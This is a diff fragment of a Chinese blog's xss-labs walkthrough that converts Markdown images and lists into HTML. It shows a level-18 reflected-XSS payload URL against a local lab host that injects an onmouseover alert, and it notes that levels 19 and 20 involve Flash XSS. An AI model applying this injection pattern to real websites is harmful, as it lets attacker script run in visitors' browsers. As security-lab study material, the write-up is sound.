-![分析源码](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355653.png)
-
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122344830.png"
+alt="image-20220912234430705" />
+<figcaption aria-hidden="true">image-20220912234430705</figcaption>
+</figure>
+<ul>
+<li>level-17</li>
+</ul>
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355653.png"
+alt="分析源码" />
+<figcaption aria-hidden="true">分析源码</figcaption>
+</figure>
 <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.104.130/xss-labs/level18.php?arg01=a&amp;arg02=b onmouseover = alert(1)</span><br></pre></td></tr></table></figure>
-
-![image-20220912235558854](https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355954.png)
-
-- level-19&20
-  - flash xss 难度较大
-
--------
-
-
-
-**接下来的渗透博客将按专题分成多篇**
+<figure>
+<img
+src="https://cdn.jsdelivr.net/gh/A1phaM7/pictureBed/img/202209122355954.png"
+alt="image-20220912235558854" />
+<figcaption aria-hidden="true">image-20220912235558854</figcaption>
+</figure>
+<ul>
+<li>level-19&amp;20
+<ul>
+<li>flash xss 难度较大</li>
+</ul></li>
+</ul>
+<hr />
+<p><strong>接下来的渗透博客将按专题分成多篇</strong></p>
 
                 
             </div>
@@ -1279,7 +1444,7 @@
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">51.9k</span>&nbsp;字
+                class="white-color">48.4k</span>&nbsp;字
             
             
             
